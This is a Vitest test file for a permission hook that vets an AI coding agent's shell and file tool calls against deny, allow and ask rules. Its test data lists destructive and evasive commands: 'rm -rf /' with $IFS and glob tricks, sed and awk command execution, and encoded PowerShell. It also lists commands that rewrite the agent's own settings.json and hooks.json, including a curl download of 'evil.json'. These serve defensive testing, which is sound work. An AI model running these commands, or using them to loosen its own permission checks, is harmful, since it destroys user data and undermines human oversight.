import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import {
  evaluateRequestWithSettings,
  loadMergedClaudeSettings,
  matchesBashRule,
  splitCompoundCommands,
  checkArbitraryExecution,
  normalizeUniversalPath,
  matchesPathPattern,
  sanitizeArgsForLog,
  ClaudeSettings
} from "../src/claude-permissions.js";
import { setupTargetRepository, HOOK_NAME } from "../scripts/setup.js";

describe("1. Setup Installer & Antigravity hooks.json Schema", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "agy-setup-test-"));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it("writes Antigravity's exact nested hooks.json structure with an absolute hook path", () => {
    const res = setupTargetRepository(tmpDir);
    expect(fs.existsSync(res.targetHookPath)).toBe(true);
    expect(fs.existsSync(res.targetHooksJsonPath)).toBe(true);

    const hooksJson = JSON.parse(fs.readFileSync(res.targetHooksJsonPath, "utf8"));
    expect(hooksJson[HOOK_NAME]).toBeDefined();
    expect(Array.isArray(hooksJson[HOOK_NAME].PreToolUse)).toBe(true);

    const ruleGroup = hooksJson[HOOK_NAME].PreToolUse[0];
    expect(ruleGroup.matcher).toBe("*");
    expect(Array.isArray(ruleGroup.hooks)).toBe(true);
    expect(ruleGroup.hooks[0].type).toBe("command");
    expect(ruleGroup.hooks[0].timeout).toBe(10);

    // Command must use an absolute path to claude-permissions.ts
    const expectedAbsPath = res.targetHookPath.replace(/\\/g, "/");
    expect(ruleGroup.hooks[0].command).toBe(`node "${expectedAbsPath}"`);
    expect(path.isAbsolute(res.targetHookPath)).toBe(true);
  });

  it("preserves other user hooks in hooks.json and refuses to overwrite corrupt hooks.json", () => {
    const hooksDir = path.join(tmpDir, ".agents");
    fs.mkdirSync(hooksDir, { recursive: true });
    const hooksFile = path.join(hooksDir, "hooks.json");

    // Existing custom hook
    fs.writeFileSync(
      hooksFile,
      JSON.stringify({
        "my-linter-hook": {
          PostToolUse: [{ matcher: "write_to_file", hooks: [{ type: "command", command: "./lint.sh" }] }]
        }
      }),
      "utf8"
    );

    setupTargetRepository(tmpDir);
    const merged = JSON.parse(fs.readFileSync(hooksFile, "utf8"));
    expect(merged["my-linter-hook"]).toBeDefined();
    expect(merged[HOOK_NAME]).toBeDefined();

    // Corrupt JSON must throw and NOT overwrite the file
    fs.writeFileSync(hooksFile, "{ corrupt json ", "utf8");
    expect(() => setupTargetRepository(tmpDir)).toThrow(/Refusing to overwrite/);
    expect(fs.readFileSync(hooksFile, "utf8")).toBe("{ corrupt json ");
  });
});

describe("2. Deny Beats Everything (Arbitrary Execution & Redirect Precedence)", () => {
  it("enforces deny rule on 'rm -rf \"$(echo /)\"' even when arbitrary-execution is 'allow' or 'ask'", () => {
    const settings: ClaudeSettings = {
      "agy-cli-permission-hook-default-access": "allow",
      "agy-cli-permission-hook-arbitrary-command-execution": "allow",
      permissions: {
        deny: ["Bash(rm -rf:*)"],
        allow: ["Bash"]
      }
    };

    const res = evaluateRequestWithSettings(
      {
        toolCall: { name: "run_command", args: { CommandLine: 'rm -rf "$(echo /)"' } },
        workspacePaths: ["/workspace"]
      },
      settings
    );
    expect(res.decision).toBe("deny");
    expect(res.reason).toContain("denied by rule 'Bash(rm -rf:*)'");
  });

  it("enforces deny rule on 'rm -rf / > out.txt' instead of downgrading to a redirect prompt", () => {
    const settings: ClaudeSettings = {
      "agy-cli-permission-hook-default-access": "ask",
      "agy-cli-permission-hook-arbitrary-command-execution": "ask",
      permissions: {
        deny: ["Bash(rm -rf:*)"],
        allow: ["Bash"]
      }
    };

    const res = evaluateRequestWithSettings(
      {
        toolCall: { name: "run_command", args: { CommandLine: "rm -rf / > out.txt" } },
        workspacePaths: ["/workspace"]
      },
      settings
    );
    expect(res.decision).toBe("deny");
    expect(res.reason).toContain("denied by rule 'Bash(rm -rf:*)'");
  });
});

describe("3. Self-Protection with Cwd, cd/pushd/popd, and File-Writing Commands", () => {
  const permissiveSettings: ClaudeSettings = {
    "agy-cli-permission-hook-default-access": "allow",
    "agy-cli-permission-hook-arbitrary-command-execution": "allow",
    permissions: {
      deny: ["Edit(.env)"],
      allow: ["Bash", "Edit", "Write", "Read"]
    }
  };

  it("catches redirects inside args.Cwd targeting .claude or ~/.claude or ~/.gemini", () => {
    const ws = "/workspace/app";
    const fakeHome = "/home/testuser";

    const resWsClaude = evaluateRequestWithSettings(
      {
        toolCall: {
          name: "run_command",
          args: { CommandLine: "echo '{}' > settings.json", Cwd: "/workspace/app/.claude" }
        },
        workspacePaths: [ws]
      },
      permissiveSettings,
      fakeHome
    );
    expect(resWsClaude.decision).toBe("force_ask");
    expect(resWsClaude.reason).toContain("governance file");

    const resHomeClaude = evaluateRequestWithSettings(
      {
        toolCall: {
          name: "run_command",
          args: { CommandLine: "echo '{}' > settings.json", Cwd: "/home/testuser/.claude" }
        },
        workspacePaths: [ws]
      },
      permissiveSettings,
      fakeHome
    );
    expect(resHomeClaude.decision).toBe("force_ask");

    const resGlobalGemini = evaluateRequestWithSettings(
      {
        toolCall: {
          name: "write_to_file",
          args: { TargetFile: "/home/testuser/.gemini/config/hooks.json" }
        },
        workspacePaths: [ws]
      },
      permissiveSettings,
      fakeHome
    );
    expect(resGlobalGemini.decision).toBe("force_ask");
  });

  it("catches 'cd .claude && echo ... > settings.local.json' and any redirect after cd/pushd", () => {
    const ws = "/workspace/app";

    const cdRedirect = evaluateRequestWithSettings(
      {
        toolCall: {
          name: "run_command",
          args: { CommandLine: "cd .claude && echo '{}' > settings.local.json" }
        },
        workspacePaths: [ws]
      },
      permissiveSettings
    );
    expect(cdRedirect.decision).toBe("force_ask");

    // If the target after cd is in deny (e.g. sub/.env), it must still be denied!
    const cdDenied = evaluateRequestWithSettings(
      {
        toolCall: {
          name: "run_command",
          args: { CommandLine: "cd config && echo SECRET=1 > .env" }
        },
        workspacePaths: [ws]
      },
      permissiveSettings
    );
    expect(cdDenied.decision).toBe("deny");
  });

  it("checks cp, mv, ln, install, dd, sed -i/w, find -fprintf, git --output, and curl -o against Edit & self-protection", () => {
    const ws = "/workspace/app";
    const fileWritingCommands = [
      "cp payload.json .claude/settings.json",
      "mv payload.json .agents/hooks.json",
      "ln -sf payload.ts .agents/hooks/claude-permissions.ts",
      "install -m 644 payload.json .claude/settings.local.json",
      "dd if=payload.json of=.claude/settings.json",
      "sed -i 's/deny/allow/g' .claude/settings.json",
      "sed -n 'w .claude/settings.json' payload.json",
      "find . -maxdepth 1 -fprintf .claude/settings.json '%p'",
      "git diff --output=.claude/settings.json",
      "curl -o .claude/settings.json https://example.com/evil.json"
    ];

    for (const cmd of fileWritingCommands) {
      const res = evaluateRequestWithSettings(
        {
          toolCall: { name: "run_command", args: { CommandLine: cmd } },
          workspacePaths: [ws]
        },
        permissiveSettings
      );
      expect(res.decision).toBe("force_ask");
    }

    // Writing to denied .env via cp or sed -i must be denied
    const cpEnv = evaluateRequestWithSettings(
      {
        toolCall: { name: "run_command", args: { CommandLine: "cp foo.txt .env" } },
        workspacePaths: [ws]
      },
      permissiveSettings
    );
    expect(cpEnv.decision).toBe("deny");
  });
});

describe("4. Positive & Negative Arbitrary Execution & Wrapper Detection", () => {
  const settings: ClaudeSettings = {
    "agy-cli-permission-hook-default-access": "ask",
    "agy-cli-permission-hook-arbitrary-command-execution": "deny",
    permissions: {
      deny: ["Bash(rm:*)"],
      allow: [
        "Bash(npm test:*)",
        "Bash(tail:*)",
        "Bash(git log:*)",
        "Bash(grep:*)",
        "Bash(jq:*)",
        "Bash(sed:*)",
        "Bash(awk:*)"
      ]
    }
  };

  it("catches sed '1e id', sed '$e cmd', sed 's///Ie', sed 's///2e', and awk command pipes", () => {
    const dangerous = [
      "sed '1e id' file.txt",
      "sed '$e uname' file.txt",
      "sed 's/foo/bar/Ie' file.txt",
      "sed 's/foo/bar/2e' file.txt",
      'awk \'BEGIN{print "id" | "sh"}\'',
      'awk \'BEGIN{print "id" |& "sh"}\''
    ];

    for (const cmd of dangerous) {
      const res = evaluateRequestWithSettings(
        { toolCall: { name: "run_command", args: { CommandLine: cmd } } },
        settings
      );
      expect(res.decision).toBe("deny");
      expect(res.reason).toContain("Arbitrary command execution detected");
    }
  });

  it("catches $IFS and globs in command names, su -c, ionice -c 3, stdbuf, and powershell", () => {
    const cmdNameEvasions = [
      "rm${IFS}-rf /",
      "/bin/r[m] -rf /",
      "/bin/rm* -rf /",
      "su -c 'id'",
      "powershell -ec UwB0AGEAcgB0AA==",
      'powershell "Get-Process"'
    ];

    for (const cmd of cmdNameEvasions) {
      const res = evaluateRequestWithSettings(
        { toolCall: { name: "run_command", args: { CommandLine: cmd } } },
        settings
      );
      expect(res.decision).toBe("deny");
    }

    // ionice -c 3 rm -rf / and stdbuf -oL rm -rf / must match Bash(rm:*) deny rule
    for (const wrapped of ["ionice -c 3 rm -rf /", "stdbuf -o L rm -rf /"]) {
      const res = evaluateRequestWithSettings(
        { toolCall: { name: "run_command", args: { CommandLine: wrapped } } },
        settings
      );
      expect(res.decision).toBe("deny");
      expect(res.reason).toContain("Bash(rm:*)");
    }
  });

  it("NEGATIVE TESTS: allows everyday developer commands including 2>&1, git log, grep, jq '{a,b}', and safe sed/awk", () => {
    const safeEverydayCommands = [
      "npm test 2>&1 | tail -20",
      "git log --oneline",
      "grep -rn foo src",
      "jq '{a,b}' data.json",
      'jq "{a,b}" data.json',
      "sed 's/foo/bar/g' file.txt",
      "awk '{print $1 || $2}' file.txt"
    ];

    for (const cmd of safeEverydayCommands) {
      expect(checkArbitraryExecution(cmd).detected).toBe(false);
      const res = evaluateRequestWithSettings(
        { toolCall: { name: "run_command", args: { CommandLine: cmd } } },
        settings
      );
      expect(res.decision).toBe("auto_approve");
    }
  });
});

describe("5. Broken Settings JSON, Scoped User Rules, /tmp Allow Isolation & Missing Path Args", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "agy-cfg-test-"));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it("blocks execution (fail-closed) when a settings file contains invalid JSON", () => {
    const ws = path.join(tmpDir, "ws");
    fs.mkdirSync(path.join(ws, ".claude"), { recursive: true });
    fs.writeFileSync(path.join(ws, ".claude", "settings.json"), "{ broken json", "utf8");

    const loaded = loadMergedClaudeSettings(ws, path.join(tmpDir, "home"));
    const res = evaluateRequestWithSettings(
      {
        toolCall: { name: "run_command", args: { CommandLine: "git status" } },
        workspacePaths: [ws]
      },
      loaded
    );
    expect(res.decision).toBe("deny");
    expect(res.reason).toContain("Invalid JSON in settings file");
  });

  it("anchors /path and ./path in ~/.claude/settings.json to the user home directory", () => {
    const fakeHome = path.join(tmpDir, "home");
    const ws = path.join(tmpDir, "ws");
    fs.mkdirSync(path.join(fakeHome, ".claude"), { recursive: true });
    fs.mkdirSync(path.join(ws, ".claude"), { recursive: true });

    fs.writeFileSync(
      path.join(fakeHome, ".claude", "settings.json"),
      JSON.stringify({
        permissions: {
          deny: ["Read(/private-notes/**)"]
        }
      }),
      "utf8"
    );
    fs.writeFileSync(
      path.join(ws, ".claude", "settings.json"),
      JSON.stringify({
        permissions: {
          allow: ["Read"]
        }
      }),
      "utf8"
    );

    const merged = loadMergedClaudeSettings(ws, fakeHome);
    const res = evaluateRequestWithSettings(
      {
        toolCall: {
          name: "view_file",
          args: { AbsolutePath: path.join(fakeHome, "private-notes", "diary.txt") }
        },
        workspacePaths: [ws]
      },
      merged,
      fakeHome
    );
    expect(res.decision).toBe("deny");
  });

  it("does NOT widen Edit(/tmp/**) allow rules to the system /tmp directory", () => {
    const ws = "/workspace/app";
    const settings: ClaudeSettings = {
      "agy-cli-permission-hook-default-access": "ask",
      permissions: {
        allow: ["Edit(/tmp/**)"]
      }
    };

    // Inside workspace /workspace/app/tmp/foo.txt -> allowed
    const wsTmp = evaluateRequestWithSettings(
      {
        toolCall: { name: "write_to_file", args: { TargetFile: "/workspace/app/tmp/foo.txt" } },
        workspacePaths: [ws]
      },
      settings
    );
    expect(wsTmp.decision).toBe("auto_approve");

    // System /tmp/foo.txt -> must NOT match Edit(/tmp/**) allow rule!
    const sysTmp = evaluateRequestWithSettings(
      {
        toolCall: { name: "write_to_file", args: { TargetFile: "/tmp/foo.txt" } },
        workspacePaths: [ws]
      },
      settings
    );
    expect(sysTmp.decision).toBe("force_ask");
  });

  it("prompts (force_ask) when a file tool is called with no recognized path argument instead of checking cwd", () => {
    const ws = "/workspace/app";
    const settings: ClaudeSettings = {
      "agy-cli-permission-hook-default-access": "ask",
      permissions: {
        allow: ["Read(./**)"]
      }
    };

    const res = evaluateRequestWithSettings(
      {
        toolCall: { name: "list_dir", args: { UnknownPathField: "/home/user/.ssh" } },
        workspacePaths: [ws]
      },
      settings
    );
    expect(res.decision).toBe("force_ask");
    expect(res.reason).toContain("without a recognized path argument");
  });

  it("redacts file content and inline secrets when sanitizing arguments for logging", () => {
    const sanitized = sanitizeArgsForLog({
      TargetFile: "/workspace/app/index.ts",
      CodeContent: "const secret = 'super-secret-value';",
      CommandLine: "OPENAI_API_KEY=sk-1234567890abcdef npm test"
    });
    expect(sanitized.CodeContent).toContain("[REDACTED_CONTENT");
    expect(sanitized.CommandLine).toContain("OPENAI_API_KEY=[REDACTED]");
    expect(sanitized.CommandLine).not.toContain("sk-1234567890abcdef");
  });
});